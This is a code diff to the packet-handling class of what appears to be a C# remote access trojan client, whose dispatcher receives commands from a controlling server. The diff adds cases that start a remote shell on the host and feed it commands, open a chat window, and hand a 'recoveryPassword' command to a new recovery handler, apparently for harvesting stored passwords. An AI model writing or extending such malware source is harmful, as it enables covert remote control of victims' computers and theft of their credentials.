@@ -1,19 +1,21 @@
-﻿using Client.MessagePack;
+﻿using Client.Helper;
+using Client.MessagePack;
 using Client.Sockets;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
+using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using Client.Recovery;
 
 namespace Client.Handle_Packet
 {
     public static class Packet
     {
         public static CancellationTokenSource cts;
+        public static FormChat GetFormChat;
 
         public static void Read(object data)
         {
@@ -58,7 +60,8 @@ namespace Client.Handle_Packet
 
                     case "recoveryPassword":
                         {
-                            new Recovery.Recovery();
+                            Received();
+                            new HandlerRecovery(unpack_msgpack);
                             break;
                         }
 
@@ -255,6 +258,37 @@ namespace Client.Handle_Packet
                                         break;
                                     }
                             }
+                            break;
+                        }
+
+                    case "shell":
+                        {
+                            HandleShell.StarShell();
+                            break;
+                        }
+
+                    case "shellWriteInput":
+                        {
+                            if (HandleShell.ProcessShell != null)
+                            HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
+                            break;
+                        }
+
+                    case "chat":
+                        {
+                            new HandlerChat().CreateChat();
+                            break;
+                        }
+
+                    case "chatWriteInput":
+                        {
+                            new HandlerChat().WriteInput(unpack_msgpack);
+                            break;
+                        }
+
+                    case "chatExit":
+                        {
+                            new HandlerChat().ExitChat();
                             break;
                         }
                 }
